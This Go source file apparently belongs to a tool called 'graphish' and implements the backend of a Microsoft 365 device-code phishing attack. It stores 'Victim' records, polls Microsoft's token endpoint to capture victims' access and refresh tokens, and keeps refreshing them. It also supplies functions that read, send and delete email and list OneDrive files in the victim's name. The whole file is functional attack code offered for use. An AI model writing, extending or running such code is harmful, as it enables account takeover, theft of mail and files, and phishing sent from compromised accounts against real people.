package db

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"time"

	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
)

type AccessTokenResponse struct {
	AccessToken  string `json:"access_token"`
	TokenType    string `json:"token_type"`
	ExpiresIn    int    `json:"expires_in"`
	RefreshToken string `json:"refresh_token"`
	Scope        string `json:"scope"`
}

// FileItem represents a file item from OneDrive
type FileItem struct {
	ID          string       `json:"id"`
	Folder      *FolderFacet `json:"folder,omitempty"`
	Name        string       `json:"name"`
	Size        int64        `json:"size"`
	FileType    *FileFacet   `json:"file,omitempty"`
	DownloadURL string       `json:"@microsoft.graph.downloadUrl"`
}

type FolderFacet struct {
	ChildCount int `json:"childCount"`
}
type FileFacet struct {
	MimeType string `json:"mimeType"`
}

type Victim struct {
	ID           uint64 `gorm:"primaryKey;autoIncrement"`
	IP           string `gorm:"not null"`
	Tenant       string `gorm:"not null"`
	DeviceCode   string `gorm:"not null"`
	AccessToken  string
	RefreshToken string
	Status       bool      `gorm:"default:false"` // false means not capture yet
	CreatedAt    time.Time `gorm:"autoCreateTime"`
}

func MigrateDB(db *gorm.DB) error {
	err := db.AutoMigrate(&Victim{})
	if err != nil {
		return err
	}
	return nil
}
func ConnectDB() *gorm.DB {
	//check if the payments.db database exist
	if _, err := os.Stat("graphish.db"); os.IsNotExist(err) {
		file, err := os.Create("graphish.db")
		if err != nil {
			panic(err)
		}
		file.Close()
	}
	//connect to the database
	db, err := gorm.Open(sqlite.Open("graphish.db"), &gorm.Config{})
	if err != nil {
		panic("failed to connect database")
	}
	return db
}

func CreateNewVictim(db *gorm.DB, device_code string, ip string, tenant string) error {
	victim := Victim{
		IP:         ip,
		DeviceCode: device_code,
		Tenant:     tenant,
	}
	result := db.Create(&victim)
	if result.Error != nil {
		return result.Error
	}
	return nil
}

// getAccessToken exchanges device code for access token
func getAccessToken(clientID string, tenant string, deviceCode string) (*AccessTokenResponse, error) {
	requestURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenant)

	// Prepare form data
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "urn:ietf:params:oauth:grant-type:device_code")
	data.Set("device_code", deviceCode)

	// Create request
	req, err := http.NewRequest("POST", requestURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("error getting access token: %d - %s", resp.StatusCode, string(body))
	}
	// Parse response
	var tokenResp AccessTokenResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}

	return &tokenResp, nil
}

func getAccessTokenFromRefreshToken(clientID, tenant, refreshToken string) (*AccessTokenResponse, error) {
	requestURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenant)

	// Prepare form data
	data := url.Values{}
	data.Set("client_id", clientID)
	data.Set("grant_type", "refresh_token")
	data.Set("refresh_token", refreshToken)

	// Create request
	req, err := http.NewRequest("POST", requestURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("error getting access token: %d - %s", resp.StatusCode, string(body))
	}
	// Parse response
	var tokenResp AccessTokenResponse
	if err := json.Unmarshal(body, &tokenResp); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}

	return &tokenResp, nil
}
func SendMail(base *gorm.DB, aceessToken string, subject string, body string, recipient string) error {
	req_url := "https://graph.microsoft.com/v1.0/me/sendMail"
	data := map[string]interface{}{
		"message": map[string]interface{}{
			"subject": subject,
			"body": map[string]interface{}{
				"contentType": "Text",
				"content":     body,
			},
			"toRecipients": []map[string]interface{}{
				{
					"emailAddress": map[string]interface{}{
						"address": recipient,
					},
				},
			},
		},
		"saveToSentItems": "true",
	}
	// Convert data to JSON
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("error marshalling JSON: %w", err)
	}
	// Create request
	req, err := http.NewRequest("POST", req_url, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+aceessToken)
	req.Header.Set("Content-Type", "application/json")
	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()
	//if the responce status code is not 202, return an error
	if resp.StatusCode != http.StatusAccepted {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("error sending mail: %d - %s", resp.StatusCode, string(body))
	}
	return nil
}

func ReadEmails(base *gorm.DB, accessToken string) ([]map[string]interface{}, error) {
	reqURL := "https://graph.microsoft.com/v1.0/me/messages"

	// Create request
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("error getting emails: %d - %s", resp.StatusCode, string(body))
	}

	var emailsResponse struct {
		Value []map[string]interface{} `json:"value"`
	}
	if err := json.Unmarshal(body, &emailsResponse); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}

	return emailsResponse.Value, nil
}

func DeleteEmail(base *gorm.DB, accessToken string, emailID string) error {
	reqURL := fmt.Sprintf("https://graph.microsoft.com/v1.0/me/messages/%s", emailID)

	// Create request
	req, err := http.NewRequest("DELETE", reqURL, nil)
	if err != nil {
		return fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("error deleting email: %d - %s", resp.StatusCode, string(body))
	}

	return nil
}

func ReadFiles(base *gorm.DB, accessToken string) ([]FileItem, error) {
	reqURL := "https://graph.microsoft.com/v1.0/me/drive/root/children"
	// Create request
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("error getting files: %d - %s", resp.StatusCode, string(body))
	}
	var filesResponse struct {
		Value []FileItem `json:"value"`
	}
	if err := json.Unmarshal(body, &filesResponse); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}
	return filesResponse.Value, nil
}
func ReadFilesinFolder(base *gorm.DB, accessToken string, folderid string) ([]FileItem, error) {
	reqURL := fmt.Sprintf("https://graph.microsoft.com/v1.0/me/drive/items/%s/children", folderid)
	// Create request
	req, err := http.NewRequest("GET", reqURL, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %w", err)
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	// Send request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %w", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("error reading response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("error getting files: %d - %s", resp.StatusCode, string(body))
	}
	var filesResponse struct {
		Value []FileItem `json:"value"`
	}
	if err := json.Unmarshal(body, &filesResponse); err != nil {
		return nil, fmt.Errorf("error parsing response: %w", err)
	}
	return filesResponse.Value, nil
}
func GetAccessTokens(base *gorm.DB, clientID string) {
	//query all victims with status false means not captured yet
	for {
		var victims []Victim
		base.Where("status = ?", false).Find(&victims)
		if len(victims) == 0 {
			time.Sleep(10 * time.Second) // wait before retrying
			continue
		}
		for _, victim := range victims {
			tokenResp, err := getAccessToken(clientID, victim.Tenant, victim.DeviceCode)
			if err != nil {
				time.Sleep(10 * time.Second) // wait before retrying
				continue
			}
			victim.AccessToken = tokenResp.AccessToken
			victim.RefreshToken = tokenResp.RefreshToken
			victim.Status = true // mark as captured
			base.Save(&victim)   // save updated victim
		}
		// Sleep for a while before checking again
		time.Sleep(10 * time.Second)
	}
}

func RefreshAccessTokens(base *gorm.DB, clientID string) {
	//query all victims with status true means captured also check if the access token is expired access token expires in one hour
	for {
		var victims []Victim
		base.Where("status = ?", true).Find(&victims)
		if len(victims) == 0 {
			time.Sleep(10 * time.Second)
			continue
		}
		for _, victim := range victims {
			// check if the access token is expired
			if time.Since(victim.CreatedAt) > time.Hour {
				tokenResp, err := getAccessTokenFromRefreshToken(clientID, victim.Tenant, victim.RefreshToken)
				if err != nil {
					time.Sleep(10 * time.Second)
					continue
				}
				victim.AccessToken = tokenResp.AccessToken
				victim.RefreshToken = tokenResp.RefreshToken
				victim.CreatedAt = time.Now() // update created at to current time
				base.Save(&victim)            // save updated victim
			}
		}
		// Sleep for a while before checking again
		time.Sleep(10 * time.Second)
	}
}
